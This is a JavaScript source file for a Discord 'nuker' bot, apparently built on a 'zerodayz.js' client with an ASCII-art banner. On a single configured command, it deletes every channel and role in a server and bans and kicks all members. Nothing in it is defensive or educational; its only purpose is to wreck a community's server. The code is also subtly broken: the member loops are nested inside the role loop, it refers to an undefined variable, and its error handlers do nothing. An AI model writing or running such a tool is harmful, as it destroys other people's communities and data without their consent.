const ZeroDayz = require('zerodayz.js')
const Discord = require("discord.js")
const client = new ZeroDayz.Client()
const config = require("./config.json")
const prefix = config.prefix
const token = config.token
const cmd = config.cmd
const prompt = require('prompt-sync')();
console.clear()



client.on("ready", function() {
        console.clear()
        console.log(`
            	
     ███▄    █  ██▓ ███▄    █  ▄▄▄██▀▀▀██░ ██  ▄▄▄      ▒██   ██▒
    ██ ▀█   █ ▓██▒ ██ ▀█   █    ▒██  ▓██░ ██▒▒████▄    ▒▒ █ █ ▒░
    ▓██  ▀█ ██▒▒██▒▓██  ▀█ ██▒   ░██  ▒██▀▀██░▒██  ▀█▄  ░░  █   ░
    ▓██▒  ▐▌██▒░██░▓██▒  ▐▌██▒▓██▄██▓ ░▓█ ░██ ░██▄▄▄▄██  ░ █ █ ▒ 
    ▒██░   ▓██░░██░▒██░   ▓██░ ▓███▒  ░▓█▒░██▓ ▓█   ▓██▒▒██▒ ▒██▒
    ░ ▒░   ▒ ▒ ░▓  ░ ▒░   ▒ ▒  ▒▓▒▒░   ▒ ░░▒░▒ ▒▒   ▓▒█░▒▒ ░ ░▓ ░
    ░ ░░   ░ ▒░ ▒ ░░ ░░   ░ ▒░ ▒ ░▒░   ▒ ░▒░ ░  ▒   ▒▒ ░░░   ░▒ ░
       ░   ░ ░  ▒ ░   ░   ░ ░  ░ ░ ░   ░  ░░ ░  ░   ▒    ░    ░  
             ░  ░           ░  ░   ░   ░  ░  ░      ░  ░ ░    ░  

           Command : ${prefix}${cmd} | Client : ${client.user.username}
                
  `)

    })

   client.on("message", message => {


   if (message.content == `${prefix}${cmd}`) {
                message.guild.channels.map(channel => {
                    channel.delete().then(() => {
                        console.log(` [-] #${channel.name} | Deleted!`)
                    }).catch(() => console.error)
                })

                message.guild.roles.map(role => {
                    role.delete().then(() => {
                        console.log(`  [-] @${role.name} | Role Deleted!`)
                    }).catch(() => console.error)

    message.guild.members.map(member => {
        member.ban().then(() => {
            console.log(`${member.user.tag} was banned from ${message.guild.name}`)
        }).catch(() => console.error)

            })

                    message.guild.members.map(member => {
                        member.kick().then(() => {
                            console.log(`  [-] ${member.user.tag} Kicked - ${msg.guild.name}`)
                        }).catch(() => console.error)
                    })
                })
            }
        })

    client.login(token);